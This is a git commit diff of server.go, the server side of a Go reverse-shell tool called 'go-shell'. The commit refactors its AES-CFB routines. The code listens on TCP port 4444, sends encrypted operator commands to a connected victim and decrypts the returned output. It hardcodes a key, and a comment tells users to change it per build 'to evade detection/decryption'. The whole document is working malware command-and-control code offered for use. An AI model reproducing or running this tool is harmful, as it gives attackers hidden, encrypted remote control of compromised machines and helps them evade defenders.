0f6643ef6baf176712851f6f05aa5025e45a6a4c
s1egesystems <51238001+s1egesystems@users.noreply.github.com>
2019-12-30 07:41:44 +0000

    Update server.go

--- server.go
+++ server.go
@@ -1,9 +1,7 @@
 package main
-// coded by s1ege greetz to all GSH members
+// coded by s1ege greetz to all gsh members
 import (
   "bufio"
-  "fmt"
-  "io"
   "net"
   "os"
   "strings"
@@ -12,6 +10,8 @@ import (
   "crypto/rand"
   "github.com/fatih/color"
   "encoding/base64"
+  "io"
+  "fmt"
 )
 
 const port = ":4444"
@@ -19,7 +19,7 @@ const port = ":4444"
 func main() {
     red := color.New(color.FgHiRed, color.Bold)
     green := color.New(color.FgHiGreen, color.Bold)
-    //Enter your 32 byte long key here (change per each build to evade detection/decryption)
+    // enter your 32 byte long key here (change per each build to evade detection/decryption)
     key := []byte("024iF4ciIdeXt9Yxk9C97QsrNrxNXzEi")
     red.Println("Listening....")
     listener, _ := net.Listen("tcp", port)
@@ -29,67 +29,62 @@ func main() {
         red.Print("go-shell> ")
         command, _ := reader.ReadString('\n')
         if strings.Compare(command, "exit") == 0 {
-            enc_command, err := encrypt(key, command)
-            if err != nil {
-                fmt.Println(err)
-            }
+            enc_command := encryption(true, key, command)
 
             conn.Write([]byte(enc_command))
             conn.Close()
             os.Exit(0)
 
         } else {
-              enc_command, err := encrypt(key, command)
-              if err != nil {
-                  fmt.Println(err)
-              }
+              enc_command := encryption(true, key, command)
 
               conn.Write([]byte(enc_command))
               enc_output, _ := bufio.NewReader(conn).ReadString('\n')
-              dec_output, err := decrypt(key, string(enc_output))
+              dec_output := encryption(false, key, string(enc_output))
               green.Println(string(dec_output))
     }
   }
 }
 
-func encrypt(key []byte, message string) (encmess string, err error) {
-    plainText := []byte(message)
+func encryption(encrypt bool, key []byte, message string) (result string) {
+    // encrypts message if the encrypt bool is true else decrypts
+    if encrypt{
+        plainText := []byte(message)
 
-    block, err := aes.NewCipher(key)
-    if err != nil {
-        return
+        block, err := aes.NewCipher(key)
+        if err != nil {
+            fmt.Println(err)
+        }
+
+        cipherText := make([]byte, aes.BlockSize+len(plainText))
+        iv := cipherText[:aes.BlockSize]
+        if _, err = io.ReadFull(rand.Reader, iv); err != nil {
+             fmt.Println(err)
+        }
+
+        stream := cipher.NewCFBEncrypter(block, iv)
+        stream.XORKeyStream(cipherText[aes.BlockSize:], plainText)
+
+        result = base64.URLEncoding.EncodeToString(cipherText)
+
+    } else {
+        cipherText, err := base64.URLEncoding.DecodeString(message)
+        if err != nil {
+            fmt.Println(err)
+        }
+
+        block, err := aes.NewCipher(key)
+        if err != nil {
+            fmt.Println(err)
+        }
+
+        iv := cipherText[:aes.BlockSize]
+        cipherText = cipherText[aes.BlockSize:]
+
+        stream := cipher.NewCFBDecrypter(block, iv)
+        stream.XORKeyStream(cipherText, cipherText)
+
+        result = string(cipherText)
     }
-
-    cipherText := make([]byte, aes.BlockSize+len(plainText))
-    iv := cipherText[:aes.BlockSize]
-    if _, err = io.ReadFull(rand.Reader, iv); err != nil {
-        return
-    }
-
-    stream := cipher.NewCFBEncrypter(block, iv)
-    stream.XORKeyStream(cipherText[aes.BlockSize:], plainText)
-
-    encmess = base64.URLEncoding.EncodeToString(cipherText)
-    return
-}
-
-func decrypt(key []byte, message string) (decmess string, err error) {
-    cipherText, err := base64.URLEncoding.DecodeString(message)
-    if err != nil {
-        return
-    }
-
-    block, err := aes.NewCipher(key)
-    if err != nil {
-        return
-    }
-
-    iv := cipherText[:aes.BlockSize]
-    cipherText = cipherText[aes.BlockSize:]
-
-    stream := cipher.NewCFBDecrypter(block, iv)
-    stream.XORKeyStream(cipherText, cipherText)
-
-    decmess = string(cipherText)
     return
 }
